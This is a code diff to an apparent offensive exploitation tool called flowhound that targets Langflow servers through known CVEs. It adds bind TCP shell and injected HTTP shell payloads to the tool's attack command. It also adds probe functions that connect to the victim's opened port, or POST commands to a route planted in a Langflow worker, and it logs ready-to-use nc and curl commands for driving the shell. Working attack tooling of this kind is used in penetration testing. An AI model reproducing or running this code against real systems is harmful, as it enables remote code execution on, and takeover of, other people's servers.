@@ -1,8 +1,11 @@
 import logging
+import socket
+import time
 from concurrent.futures import ThreadPoolExecutor
 from concurrent.futures import TimeoutError as FutureTimeoutError
 
 import click
+import requests
 
 from flowhound.cli.banner import banner
 from flowhound.cli.validators import (
@@ -20,23 +23,100 @@ from flowhound.vulnerabilities.exploits.base_exploit_class import ExploitBaseCla
 from flowhound.vulnerabilities.io.database import Database
 from flowhound.vulnerabilities.io.version_detection import detect_target
 from flowhound.vulnerabilities.payloads import PAYLOAD_MAP
+from flowhound.vulnerabilities.payloads.bind_langflow_http_shell import (
+    BIND_LANGFLOW_HTTP_ROUTE,
+)
+from flowhound.vulnerabilities.payloads.bind_langflow_http_shell import (
+    Payload as BindLangflowHttpShellPayload,
+)
+from flowhound.vulnerabilities.payloads.bind_tcp_shell import (
+    Payload as BindTcpShellPayload,
+)
 
 EXPLOIT_TIMEOUT = ExploitBaseClass.TIMEOUT
 logger = logging.getLogger(__name__)
 
 
-def _get_payload(cmd: str | None, reverse_shell: str | None):
-    parsed_reverse_shell = validate_payload_args(cmd=cmd, reverse_shell=reverse_shell)
+def _get_payload(
+    cmd: str | None,
+    reverse_shell: str | None,
+    bind_shell: str | None,
+    bind_langflow_http: str | None,
+):
+    parsed = validate_payload_args(
+        cmd=cmd,
+        reverse_shell=reverse_shell,
+        bind_shell=bind_shell,
+        bind_langflow_http=bind_langflow_http,
+    )
 
     if cmd:
         logger.info(f"Using execute_bash_command payload: {cmd!r}")
         return PAYLOAD_MAP["command"](cmd=cmd)
-    elif parsed_reverse_shell:
-        lhost, lport = parsed_reverse_shell
+    elif bind_shell and parsed:
+        rhost, rport = parsed
+        logger.info(f"Using bind_tcp_shell payload: {rhost}:{rport}")
+        return PAYLOAD_MAP["bind_shell"](rhost=rhost, rport=rport)
+    elif bind_langflow_http and parsed:
+        rhost, rport = parsed
+        logger.info(f"Using bind_langflow_http_shell payload: {rhost}:{rport}")
+        return PAYLOAD_MAP["bind_langflow_http"](rhost=rhost, rport=rport)
+    elif reverse_shell and parsed:
+        lhost, lport = parsed
         logger.info(f"Using reverse_tcp_shell payload: {lhost}:{lport}")
         return PAYLOAD_MAP["reverse_shell"](lhost=lhost, lport=lport)
 
     return None
+
+
+_BIND_PROBE_TIMEOUT = 10  # seconds to wait for the victim port to open
+
+# Langflow runs under gunicorn with (cpu_count*2)+1 uvicorn workers.  The
+# injected route only lives in the one worker that executed the payload.
+# Sending this many probes makes it statistically certain (>99.9% with ≤15
+# workers) that at least one probe lands on the patched worker.
+_BIND_HTTP_PROBE_ATTEMPTS = 30
+
+
+def _probe_bind_shell(
+    rhost: str, rport: int, timeout: int = _BIND_PROBE_TIMEOUT
+) -> bool:
+    """Attempt a TCP connection to rhost:rport using connect_ex.
+
+    Returns True if the port is open (connect_ex == 0), False otherwise.
+    This doubles as the attacker-side connection that the victim's accept()
+    unblocks on — the shell is established when this succeeds.
+    """
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as _s:
+        _s.settimeout(timeout)
+        result = _s.connect_ex((rhost, rport))
+    return result == 0
+
+
+def _probe_bind_langflow_http(
+    rhost: str, rport: int, timeout: int = _BIND_PROBE_TIMEOUT
+) -> bool:
+    """POST a test command to the injected HTTP shell route.
+
+    Retries up to _BIND_HTTP_PROBE_ATTEMPTS times to account for gunicorn
+    multi-worker deployments: the route only exists in the worker that ran
+    the payload, so repeated requests cycle through workers until one hits.
+
+    Returns True as soon as any attempt gets HTTP 200, False if all fail.
+    """
+    url = f"http://{rhost}:{rport}{BIND_LANGFLOW_HTTP_ROUTE}"
+    for _ in range(_BIND_HTTP_PROBE_ATTEMPTS):
+        try:
+            resp = requests.post(url, json={"cmd": "id"}, timeout=timeout)
+            if resp.status_code == 200:
+                body = resp.json()
+                logger.info(
+                    f"Shell probe output: {body.get('output', '').strip()!r}  (rc={body.get('returncode')})"
+                )
+                return True
+        except requests.RequestException:
+            pass
+    return False
 
 
 def _run_with_timeout(fn, *args, timeout: int = EXPLOIT_TIMEOUT, **kwargs) -> bool:
@@ -201,17 +281,59 @@ def _run_exploits(
             )
         except FutureTimeoutError:
             if payload and payload.blocking:
-                # A blocking payload (e.g. reverse shell) keeps the exploit
-                # thread alive for the duration of the shell session. A timeout
-                # here means the payload is still running — treat it as success.
-                logger.info(
-                    f"Exploit for {vuln.cve_id} timed out — "
-                    "blocking payload is still executing. Check your listener."
-                )
+                # Blocking payloads (reverse shell / bind shell) keep the
+                # exploit thread alive.  A timeout means the payload is still
+                # running — treat it as success and fall through to the probe
+                # below for bind shells.
                 result = True
             else:
                 logger.warning(
                     f"Exploit for {vuln.cve_id} timed out after {EXPLOIT_TIMEOUT}s. Skipping."
+                )
+                result = False
+
+        # For a bind TCP shell the exploit returns as soon as the victim's
+        # payload code runs, but the victim's accept() is still blocking.
+        # Probe the port now — connect_ex == 0 means the listener is up and
+        # this connection becomes the shell the attacker will use.
+        if result and payload and isinstance(payload, BindTcpShellPayload):
+            port_open = _probe_bind_shell(rhost=payload.rhost, rport=payload.rport)
+            if port_open:
+                logger.info(
+                    f"Exploit for {vuln.cve_id} — bind shell is live on "
+                    f"{payload.rhost}:{payload.rport}. Connect with: "
+                    f"nc {payload.rhost} {payload.rport}"
+                )
+                result = True
+            else:
+                logger.warning(
+                    f"Exploit for {vuln.cve_id} — payload ran but port "
+                    f"{payload.rhost}:{payload.rport} is not reachable. "
+                    "Bind shell may have failed."
+                )
+                result = False
+
+        # For a bind HTTP shell, wait briefly for Starlette to compile the new
+        # route into its dispatch table, then probe to confirm the route is live.
+        if result and payload and isinstance(payload, BindLangflowHttpShellPayload):
+            time.sleep(2)
+            route_live = _probe_bind_langflow_http(
+                rhost=payload.rhost, rport=payload.rport
+            )
+            if route_live:
+                logger.info(
+                    f"Exploit for {vuln.cve_id} — HTTP shell is live. "
+                    f"Send commands with: "
+                    f"curl -s -X POST http://{payload.rhost}:{payload.rport}{BIND_LANGFLOW_HTTP_ROUTE} "
+                    f'-H "Content-Type: application/json" '
+                    f'-d \'{{"cmd":"id"}}\''
+                )
+                result = True
+            else:
+                logger.warning(
+                    f"Exploit for {vuln.cve_id} — payload ran but HTTP shell "
+                    f"route is not reachable at "
+                    f"http://{payload.rhost}:{payload.rport}{BIND_LANGFLOW_HTTP_ROUTE}."
                 )
                 result = False
 
@@ -254,6 +376,18 @@ def _run_exploits(
     help="LHOST:LPORT for a reverse TCP shell payload (e.g. 192.168.1.10:4444).",
 )
 @click.option(
+    "--bind_shell",
+    required=False,
+    default=None,
+    help="RHOST:RPORT Victim opens a TCP port for attacker to connect to (e.g. 192.168.1.30:4444).",
+)
+@click.option(
+    "--bind_langflow_http",
+    required=False,
+    default=None,
+    help="RHOST:RPORT Inject an HTTP shell onto the victim's existing web port (e.g. 192.168.1.30:7860).",
+)
+@click.option(
     "--application",
     required=False,
     default=None,
@@ -277,12 +411,19 @@ def attack(
     proxy: dict[str, str] | None,
     cmd: str | None,
     reverse_shell: str | None,
+    bind_shell: str | None,
+    bind_langflow_http: str | None,
     application: str | None,
     cve: str | None,
 ):
     banner()
     db: Database = ctx.obj
-    payload = _get_payload(cmd=cmd, reverse_shell=reverse_shell)
+    payload = _get_payload(
+        cmd=cmd,
+        reverse_shell=reverse_shell,
+        bind_shell=bind_shell,
+        bind_langflow_http=bind_langflow_http,
+    )
     has_credentials = validate_authentication(username=username, password=password)
 
     application, target_version = _detect_or_fail(
